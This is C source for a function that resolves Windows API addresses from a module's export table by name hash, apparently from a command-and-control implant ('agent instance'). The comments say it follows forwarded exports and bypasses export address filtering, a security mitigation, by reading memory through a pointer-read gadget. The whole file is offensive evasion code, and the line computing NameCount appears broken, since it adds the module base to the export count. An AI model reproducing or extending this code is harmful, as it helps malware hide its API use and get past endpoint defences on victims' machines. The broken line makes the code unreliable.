
/* lmfao (?) */
#define LDR_EXPDIR_VIRTADDRESS ( 0x88 )
#define LDR_EXPDIR_SIZE        ( 0x8C )

/*!
 * @brief
 *  Load function address from module.
 *  detects and resolves forwarded functions.
 *  bypasses EAF (export address filtering)
 *
 * @param Gadget
 *  read arbitrary ptr gadget
 *
 * @param Module
 *  module to resolve function from
 *
 * @param Hash
 *  function hash to resolve
 *
 * @return
 *  returns the function pointer
 *  if found.
 */
FUNC PVOID LdrFunctionEx(
    _In_ PVOID Gadget,
    _In_ PVOID Module,
    _In_ ULONG Hash
) {
    PVOID                   NtHeader             = { 0 };
    PIMAGE_EXPORT_DIRECTORY ExpDir               = { 0 };
    DWORD                   ExpDirSize           = { 0 };
    PDWORD                  AddrNames            = { 0 };
    PDWORD                  AddrFuncs            = { 0 };
    PWORD                   AddrOrdns            = { 0 };
    DWORD                   NameCount            = { 0 };
    PCHAR                   FuncName             = { 0 };
    PVOID                   FuncAddr             = { 0 };
    DWORD                   ForwOffs             = { 0 };
    DWORD                   ForwSize             = { 0 };
    CHAR                    ForwName[ MAX_PATH ] = { 0 };
    PVOID                   ForwData[ 2 ]        = { 0 }; // 0 = Module, 1 = Function

    /* check args */
    if ( ! Gadget || ! Module || ! Hash ) {
        return NULL;
    }

    RtlSecureZeroMemory( ForwName, sizeof( ForwName ) );

    /* parse Nt header */
    NtHeader   = C_PTR( U_PTR( Module ) + ( ( LONG  ) ReadPtr( U_PTR( Module   ) + FIELD_OFFSET( IMAGE_DOS_HEADER, e_lfanew ), Gadget ) ) );
    ExpDir     = C_PTR( U_PTR( Module ) + ( ( DWORD ) ReadPtr( U_PTR( NtHeader ) + LDR_EXPDIR_VIRTADDRESS, Gadget ) ) );
    ExpDirSize = U_PTR( ( ( DWORD ) ReadPtr( U_PTR( NtHeader ) + LDR_EXPDIR_SIZE, Gadget ) ) );

    /* does it contain an export directory ? */
    if ( ExpDir )
    {
        /* get export arrays */
        AddrNames = C_PTR( U_PTR( Module ) + ( ( DWORD ) ReadPtr( U_PTR( ExpDir ) + FIELD_OFFSET( IMAGE_EXPORT_DIRECTORY, AddressOfNames        ), Gadget ) ) );
        AddrFuncs = C_PTR( U_PTR( Module ) + ( ( DWORD ) ReadPtr( U_PTR( ExpDir ) + FIELD_OFFSET( IMAGE_EXPORT_DIRECTORY, AddressOfFunctions    ), Gadget ) ) );
        AddrOrdns = C_PTR( U_PTR( Module ) + ( ( DWORD ) ReadPtr( U_PTR( ExpDir ) + FIELD_OFFSET( IMAGE_EXPORT_DIRECTORY, AddressOfNameOrdinals ), Gadget ) ) );
        NameCount = U_PTR( U_PTR( Module ) + ( ( DWORD ) ReadPtr( U_PTR( ExpDir ) + FIELD_OFFSET( IMAGE_EXPORT_DIRECTORY, NumberOfNames         ), Gadget ) ) );
	
	/* iterate over exported function array */
        for ( DWORD i = 0; i < NameCount; i++ )
        {
            FuncName = C_PTR( U_PTR( Module ) + AddrNames[ i ] );

	    /* hash function name and compare it to the one we specified */ 
            if ( HashString( FuncName, 0 ) == Hash )
            {
                FuncAddr = C_PTR( Module + AddrFuncs[ AddrOrdns[ i ] ] );

                /* check if it's a forwarded function.
                 * NOTE: requires agent instance to be initialized */
                if ( ( U_PTR( FuncAddr ) >= U_PTR( ExpDir ) ) &&
                     ( U_PTR( FuncAddr ) <  U_PTR( ExpDir ) + ExpDirSize )
                ) {
                    /* get size of the forwarded function string */
                    ForwSize = StringLengthA( FuncAddr );

                    /* backup string */
                    MemCopy( ForwName, FuncAddr, ForwSize );

                    /* find the '.' in the 'module.function' forwarded function string */
                    for ( ForwOffs = 0; ForwOffs < ForwSize; ForwOffs++ ) {
                        if ( ForwName[ ForwOffs ] == '.' ) {
                            break;
                        }
                    }

                    /* split the forwarded function string into two strings */
                    ForwName[ ForwOffs ] = 0;

                    /* save module & function string */
                    ForwData[ 0 ] = ForwName;
                    ForwData[ 1 ] = ForwName + ForwOffs + 1;

                    /* call this function again to resolve the actual address */
                    FuncAddr = LdrFunctionEx( Gadget, LdrModuleLoad( ForwData[ 0 ] ), HashString( ForwData[ 1 ], 0 ) );

                    /* clear string from stack */
                    RtlSecureZeroMemory( ForwName, sizeof( ForwName ) );
                }

                break;
            }
        }
    }
	
    /* return found function address */
    return FuncAddr;
}
